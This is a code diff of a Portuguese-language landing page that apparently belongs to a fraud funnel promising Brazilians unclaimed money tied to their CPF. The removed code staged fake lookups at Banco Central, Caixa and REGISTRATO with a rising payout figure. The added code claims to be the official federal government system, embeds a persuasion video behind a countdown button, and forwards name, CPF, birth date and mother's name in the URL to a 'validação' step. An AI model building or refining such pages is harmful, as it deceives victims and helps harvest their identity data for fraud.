@@ -131,7 +131,7 @@
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- User Data Manager -->
-    <script src="../../js/user-data-manager.js"></script>
+    <script src="/js/user-data-manager.js"></script>
     <script>
       tailwind.config = {
         theme: {
@@ -560,42 +560,59 @@
           </div>
         </div>
       </header>
+            <vturb-smartplayer id="vid-68c8cdcb5c50e75475e9c7cb" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/51079383-52d2-47d5-8814-668cf878a2e5/players/68c8cdcb5c50e75475e9c7cb/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
 
-    <!-- Main Content -->
-    <main class="px-0 md:px-1 py-4 md:flex md:justify-center md:items-start md:pt-8">
-      <div class="bg-white rounded-none md:rounded-lg shadow-none md:shadow-sm border-0 md:border border-gray-200 p-3 mx-0 md:mx-1 md:max-w-4xl w-full">
-        <div class="text-center mb-6">
-          <h1 class="text-2xl font-bold text-gray-800 mb-2" data-consult-title>Consultando dados de Silvio</h1>
-          <p class="text-gray-600">Aumente o volume e assista enquanto verificamos suas informações no sistema</p>
-          
-          <p class="text-sm text-gray-500 mt-1">CPF : <span data-user-cpf>717.148.209-04</span></p>
-        </div>
-            <vturb-smartplayer id="vid-68c8cda942e61f4d973be3e1" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/51079383-52d2-47d5-8814-668cf878a2e5/players/68c8cda942e61f4d973be3e1/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
-            
-        <div class="mb-6" id="loading-section">
-          <div class="flex items-center justify-center gap-3 mb-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
-            <div class="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin flex-shrink-0"></div>
-            <p class="text-base md:text-lg font-medium text-blue-800 animate-pulse text-center" id="loading-text">Consultando Banco Central...</p>
-          </div>
-        </div>
+<div style="margin-top: 20px;"></div>
+
+<div class="text-center">
+  <button id="continuar-saque-btn" onclick="redirectToValidacao()" class="w-full px-8 py-4 font-bold text-lg rounded-full transition-all duration-300 flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white transform hover:scale-105 cursor-pointer">
+    <svg fill="currentColor" viewBox="0 0 10 20" class="w-5 h-5">
+      <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+    </svg>
+    CONTINUAR SAQUE
+  </button>
+</div>
+
+<!-- Temporizador e controle do botão -->
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const btn = document.getElementById("continuar-saque-btn");
+    let countdown = 32;
+    
+    // Desativa o botão inicialmente
+    btn.disabled = true;
+    btn.classList.add("opacity-50", "cursor-not-allowed");
+    
+    // Cria o contador visual
+    const timerText = document.createElement("div");
+    timerText.style.marginTop = "10px";
+    timerText.style.fontWeight = "bold";
+    timerText.style.color = "#4B5563"; // cinza escuro
+    timerText.textContent = `Aguarde ${countdown} segundos...`;
+    btn.parentNode.appendChild(timerText);
+    
+    const interval = setInterval(() => {
+      countdown--;
+      timerText.textContent = `Aguarde ${countdown} segundos...`;
+      
+      if (countdown <= 0) {
+        clearInterval(interval);
+        btn.disabled = false;
+        btn.classList.remove("opacity-50", "cursor-not-allowed");
+        timerText.remove();
+      }
+    }, 1000);
+  });
+</script>
         
-        <div class="text-center mb-8">
-          <h2 class="text-lg text-gray-600 mb-2">Valor encontrado para saque:</h2>
-          <p class="text-4xl font-bold text-green-600 mb-4" id="value-display">Calculando...</p>
-        </div>
-        
-        <div class="text-center" id="button-section" style="display: none;">
-          <button onclick="redirectToValidar()" class="px-8 py-4 bg-green-600 hover:bg-green-700 text-white font-bold text-lg rounded-full transition-all duration-500">Continuar com o saque</button>
-        </div>
-        
-        <div class="mt-6 p-4 bg-green-50 border border-green-200 rounded-lg animate-fade-in" id="success-message" style="display: none;">
+        <div class="mt-8 p-4 bg-blue-50 border border-blue-200 rounded-lg">
           <div class="flex items-center gap-2 mb-2">
-            <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5 text-green-600">
-              <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+            <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5 text-blue-600">
+              <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
             </svg>
-            <h3 class="font-semibold text-green-800">Consulta finalizada com sucesso!</h3>
+            <h3 class="font-semibold text-blue-800">Importante</h3>
           </div>
-          <p class="text-green-700 text-sm">Encontramos valores disponíveis para saque em seu CPF. Clique no botão acima para prosseguir com o processo.</p>
+          <p class="text-blue-700 text-sm">Você está acessando o sistema oficial do governo federal. Assista ao vídeo completo para entender todas as etapas do processo de indenização.</p>
         </div>
       </div>
     </main>
@@ -782,22 +799,15 @@
         });
       });
 
-      // Função para controlar o dropdown do usuário
-      function toggleDropdown() {
-        const dropdown = document.getElementById('user-dropdown');
-        dropdown.classList.toggle('hidden');
-      }
-
-      // Função para redirecionar para validar
-      function redirectToValidar() {
-        console.log('🚀 Redirecionando para validar...');
+      // Função para redirecionar para validacao
+      function redirectToValidacao() {
+        console.log('🚀 Redirecionando para validação...');
         
-        // PRIORIDADE 1: Verificar se JÁ EXISTEM dados na URL atual
+        // Tentar obter dados da URL atual
         const urlParams = new URLSearchParams(window.location.search);
         let userData = null;
         
         if (urlParams.has('nome') || urlParams.has('cpf')) {
-          console.log('🔗 DADOS REAIS ENCONTRADOS NA URL - usando eles!');
           userData = {
             nome: urlParams.get('nome'),
             cpf: urlParams.get('cpf'),
@@ -806,10 +816,10 @@
             estadoCivil: urlParams.get('estadoCivil'),
             nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
           };
-          console.log('✅ Dados reais da URL:', userData);
+          console.log('🔗 Dados encontrados na URL:', userData);
         }
         
-        // PRIORIDADE 2: Tentar user-data-manager (só se não tem dados na URL)
+        // Se não tem dados na URL, tentar user-data-manager
         if (!userData && typeof window.getUserData === 'function') {
           try {
             userData = window.getUserData();
@@ -819,169 +829,48 @@
           }
         }
         
-        // PRIORIDADE 3: Usar dados de sessionStorage (só se não tem dados reais)
-        if (!userData) {
-          const sessionData = sessionStorage.getItem('userData');
-          if (sessionData) {
-            try {
-              userData = JSON.parse(sessionData);
-              console.log('✅ Dados obtidos via sessionStorage:', userData);
-            } catch (error) {
-              console.log('❌ Erro ao parsear sessionStorage:', error);
+        // Construir URL de destino
+        let targetURL = '../validacao/index.html';
+        
+        // Se tem dados, adicionar à URL
+        if (userData) {
+          const params = new URLSearchParams();
+          
+          // Adicionar dados do usuário
+          if (userData.nome) params.set('nome', userData.nome);
+          if (userData.cpf) params.set('cpf', userData.cpf);
+          if (userData.nascimento) params.set('nascimento', userData.nascimento);
+          if (userData.nomeMae) params.set('nomeMae', userData.nomeMae);
+          if (userData.estadoCivil) params.set('estadoCivil', userData.estadoCivil);
+          if (userData.nomeCompleto) params.set('nomeCompleto', userData.nomeCompleto);
+          
+          // Preservar UTMs da URL atual
+          const currentParams = new URLSearchParams(window.location.search);
+          ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(utm => {
+            if (currentParams.has(utm)) {
+              params.set(utm, currentParams.get(utm));
             }
+          });
+          
+          if (params.toString()) {
+            targetURL += '?' + params.toString();
           }
+          
+          console.log('🔗 URL de redirecionamento com dados:', targetURL);
         }
         
-        // ÚLTIMO RECURSO: Dados simulados (só se não tem NADA)
-        if (!userData) {
-          console.log('⚠️ Usando dados simulados como último recurso');
-          userData = {
-            nome: 'Silvio',
-            cpf: '717.148.209-04',
-            nascimento: '15/12/1975',
-            nomeMae: 'Maria da Silva Santos',
-            estadoCivil: 'Solteiro(a)'
-          };
+        // Usar a função de navegação com UTMs se disponível, senão usar redirecionamento direto
+        if (typeof window.navigateWithUTMs === 'function' && !userData) {
+          window.navigateWithUTMs('../validacao/index.html');
+        } else {
+          window.location.href = targetURL;
         }
-        
-        // Criar URL com parâmetros
-        const params = new URLSearchParams();
-        if (userData.nome) params.set('nome', userData.nome);
-        if (userData.cpf) params.set('cpf', userData.cpf);
-        if (userData.nascimento) params.set('nascimento', userData.nascimento);
-        if (userData.nomeMae) params.set('nomeMae', userData.nomeMae);
-        if (userData.estadoCivil) params.set('estadoCivil', userData.estadoCivil);
-        if (userData.nomeCompleto) params.set('nomeCompleto', userData.nomeCompleto);
-        
-        // Preservar UTMs se existirem
-        const currentParams = new URLSearchParams(window.location.search);
-        ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term'].forEach(utm => {
-          if (currentParams.get(utm)) {
-            params.set(utm, currentParams.get(utm));
-          }
-        });
-        
-        console.log('🔗 Redirecionando com dados na URL:', params.toString());
-        console.log('📋 Dados finais sendo enviados:', userData);
-        window.location.href = `validar/index.html?${params.toString()}`;
       }
 
-      // Sequência de consultas simuladas
-      const consultSequence = [
-        { text: "Consultando Banco Central...", value: "Calculando...", delay: 4000 },
-        { text: "Consultando Caixa Econômica...", value: "R$ 1.494,00", delay: 4000 },
-        { text: "Consultando registros bancários antigos...", value: "R$ 2.094,00", delay: 4000 },
-        { text: "Verificando histórico de pendências...", value: "R$ 2.094,00", delay: 4000 },
-        { text: "Verificando histórico de pendências...", value: "R$ 2.394,00", delay: 4000 },
-        { text: "Cruzando dados CPF x Bacen...", value: "R$ 2.394,00", delay: 4000 },
-        { text: "Analisando contas inativas...", value: "R$ 3.314,00", delay: 4000 },
-        { text: "Verificando valores esquecidos...", value: "R$ 3.314,00", delay: 4000 },
-        { text: "Consultando sistema REGISTRATO...", value: "R$ 4.514,00", delay: 4000 },
-        { text: "Validando documentação...", value: "R$ 4.514,00", delay: 4000 },
-        { text: "Finalizando consulta...", value: "R$ 5.960,50", delay: 4000 }
-      ];
-
-      function startConsultSequence() {
-        const loadingText = document.getElementById('loading-text');
-        const valueDisplay = document.getElementById('value-display');
-        const loadingSection = document.getElementById('loading-section');
-        const buttonSection = document.getElementById('button-section');
-        const successMessage = document.getElementById('success-message');
-        
-        // VERIFICAR SE JÁ EXISTEM DADOS REAIS ANTES DE SOBRESCREVER
-        let existingData = null;
-        
-        // Verificar URL primeiro
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.has('nome') || urlParams.has('cpf')) {
-          console.log('🔗 DADOS REAIS NA URL - não sobrescrever!');
-          existingData = {
-            nome: urlParams.get('nome'),
-            cpf: urlParams.get('cpf'),
-            nascimento: urlParams.get('nascimento'),
-            nomeMae: urlParams.get('nomeMae'),
-            estadoCivil: urlParams.get('estadoCivil'),
-            nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
-          };
-        }
-        
-        // Verificar sessionStorage
-        if (!existingData) {
-          const sessionData = sessionStorage.getItem('userData');
-          if (sessionData) {
-            try {
-              const parsed = JSON.parse(sessionData);
-              // Se não são dados do Silvio, manter
-              if (parsed.nome !== 'Silvio' && parsed.cpf !== '717.148.209-04') {
-                console.log('✅ Dados reais no sessionStorage - não sobrescrever!');
-                existingData = parsed;
-              }
-            } catch (error) {
-              console.log('❌ Erro ao parsear sessionStorage:', error);
-            }
-          }
-        }
-        
-        // SÓ usar dados simulados se NÃO tem dados reais
-        if (!existingData) {
-          console.log('⚠️ Nenhum dado real encontrado - usando dados simulados');
-          const consultData = {
-            cpf: '717.148.209-04',
-            nome: 'Silvio',
-            nomeCompleto: 'Silvio Santos Silva',
-            nascimento: '15/12/1975',
-            sexo: 'M',
-            renda: '2500.00',
-            nomeMae: 'Maria da Silva Santos',
-            estadoCivil: 'Solteiro(a)',
-            valorEncontrado: 'R$ 5.960,50',
-            // Dados adicionais para validação
-            endereco: {
-              cep: '01310-100',
-              rua: 'Avenida Paulista, 1578',
-              bairro: 'Bela Vista',
-              cidade: 'São Paulo',
-              estado: 'SP'
-            },
-            telefone: '(11) 99999-8888',
-            email: 'silvio.santos@email.com',
-            profissao: 'Comerciante'
-          };
-          
-          // Salvar dados simulados no sessionStorage
-          sessionStorage.setItem('userData', JSON.stringify(consultData));
-          console.log('💾 Dados simulados salvos no sessionStorage:', consultData);
-        } else {
-          console.log('✅ Mantendo dados reais existentes:', existingData);
-        }
-        
-        let currentStep = 0;
-
-        function nextStep() {
-          if (currentStep < consultSequence.length) {
-            const step = consultSequence[currentStep];
-            
-            // Atualizar texto e valor
-            loadingText.textContent = step.text;
-            valueDisplay.innerHTML = step.value;
-            
-            currentStep++;
-            
-            // Agendar próximo passo
-            setTimeout(nextStep, step.delay);
-          } else {
-            // Finalizar sequência
-            loadingSection.style.display = 'none';
-            buttonSection.style.display = 'block';
-            successMessage.style.display = 'block';
-            
-            // Confirmar que os dados ainda estão salvos
-            console.log('✅ Consulta finalizada. Dados no sessionStorage:', sessionStorage.getItem('userData'));
-          }
-        }
-
-        // Iniciar sequência
-        nextStep();
+      // Função para controlar o dropdown do usuário
+      function toggleDropdown() {
+        const dropdown = document.getElementById('user-dropdown');
+        dropdown.classList.toggle('hidden');
       }
 
       // Adicionar event listener ao botão do usuário
@@ -1002,9 +891,71 @@
             dropdown.classList.add('hidden');
           }
         });
-
-        // Iniciar sequência de consulta após 1 segundo
-        setTimeout(startConsultSequence, 1000);
+        
+        // SISTEMA DE CARREGAMENTO DE DADOS REAIS
+        function loadUserDataFromURL() {
+          console.log('🔍 Carregando dados do usuário na página validar...');
+          
+          // PRIORIDADE 1: Verificar dados na URL
+          const urlParams = new URLSearchParams(window.location.search);
+          let userData = null;
+          
+          if (urlParams.has('nome') || urlParams.has('cpf')) {
+            userData = {
+              nome: urlParams.get('nome'),
+              cpf: urlParams.get('cpf'),
+              nascimento: urlParams.get('nascimento'),
+              nomeMae: urlParams.get('nomeMae'),
+              estadoCivil: urlParams.get('estadoCivil'),
+              nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
+            };
+            console.log('✅ Dados encontrados na URL:', userData);
+          }
+          
+          // PRIORIDADE 2: Tentar user-data-manager
+          if (!userData && typeof window.getUserData === 'function') {
+            try {
+              userData = window.getUserData();
+              console.log('✅ Dados obtidos via getUserData:', userData);
+            } catch (error) {
+              console.log('❌ Erro getUserData:', error);
+            }
+          }
+          
+          // PRIORIDADE 3: SessionStorage
+          if (!userData) {
+            const sessionData = sessionStorage.getItem('userData');
+            if (sessionData) {
+              try {
+                userData = JSON.parse(sessionData);
+                console.log('✅ Dados obtidos via sessionStorage:', userData);
+              } catch (error) {
+                console.log('❌ Erro ao parsear sessionStorage:', error);
+              }
+            }
+          }
+          
+          // Atualizar interface com dados reais
+          if (userData) {
+            updatePageWithUserData(userData);
+          } else {
+            console.log('⚠️ Nenhum dado de usuário encontrado - mantendo dados padrão');
+          }
+        }
+        
+        function updatePageWithUserData(userData) {
+          console.log('🔧 Atualizando página validar com dados:', userData);
+          
+          // Atualizar saudação no dropdown
+          const userGreeting = document.querySelector('[data-user-greeting]');
+          if (userGreeting && userData.nome) {
+            userGreeting.textContent = `Olá, ${userData.nome}!`;
+            console.log('✅ Saudação atualizada para:', userData.nome);
+          }
+        }
+        
+        // Carregar dados quando a página carrega
+        loadUserDataFromURL();
       });
     </script>
   </body>
